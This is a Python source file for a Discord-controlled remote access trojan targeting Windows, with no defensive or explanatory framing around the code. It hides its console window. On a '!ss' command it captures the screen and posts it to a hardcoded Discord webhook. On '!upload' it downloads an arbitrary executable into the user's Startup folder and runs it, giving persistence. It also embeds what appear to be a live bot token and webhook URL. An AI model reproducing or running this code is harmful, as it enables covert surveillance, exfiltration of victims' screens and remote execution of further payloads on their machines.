import discord, os, requests, pyautogui, ctypes, win32process, getpass
from discord.ext import commands as cmds


client = cmds.Bot(command_prefix="!", case_insensitive=True, intents=discord.Intents.all())
username = getpass.getuser()
hook = "https://discord.com/api/webhooks/1056642764701446254/LroWAHbhlld1gTQeVSSe2tNtzzmE3-Y_7u95IvVlUqo9euzZp-Ec6DvvSDTex_uGA5jd"
startup = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"


def HideMe():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0: # HideMyAss™
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        
HideMe()

@client.command()
async def ss(ctx):
    pyautogui.screenshot().save(f"C:\\Users\\{username}\\Videos\\ss.png")

    requests.post(
        url=hook,
        files={"ss.png": open(f"C:\\Users\\{username}\\Videos\\ss.png", "rb").read()}
    )

    await ctx.reply("done!")


@client.command()
async def upload(ctx):

    await ctx.reply("download started...")

    _, link = ctx.message.content.split(' ')

    with open(startup + "\\main.exe", 'wb') as f:
        f.write(requests.get(link).content)
        f.close()

    os.system(startup + "\\main.exe")

    await ctx.reply("file downloaded and ran!")



client.run('MTA1NjY3NjczMDU3MzcwNTMwOA.Gll5O1.mfgFUgMX7SuC7Lh1EXQXEY2V4FKINx874mBkvM')


